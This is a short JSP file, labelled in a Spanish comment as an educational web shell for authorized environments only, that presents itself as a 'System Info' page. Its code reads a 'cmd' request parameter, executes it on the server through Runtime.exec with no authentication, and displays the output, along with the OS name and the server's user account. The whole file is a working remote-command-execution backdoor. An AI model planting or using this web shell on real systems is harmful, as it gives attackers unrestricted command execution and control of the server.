<%-- 
Webshell educativa - Solo para entornos autorizados
--%>
<%@ page import="java.util.*,java.io.*,java.lang.*" %>
<%
// Verificación básica de parámetro
String cmd = request.getParameter("cmd");
String output = "";

if(cmd != null) {
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            output += line + "\n";
        }
        br.close();
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }
}
%>

<html>
<head><title>System Info</title></head>
<body>
<h3>System Information</h3>
<pre>
OS: <%= System.getProperty("os.name") %>
User: <%= System.getProperty("user.name") %>
</pre>

<form method="post">
Command: <input type="text" name="cmd" size="50" 
       value="<%= cmd != null ? cmd : "whoami" %>">
<input type="submit" value="Execute">
</form>

<pre>
<%= output %>
</pre>
</body>
</html>
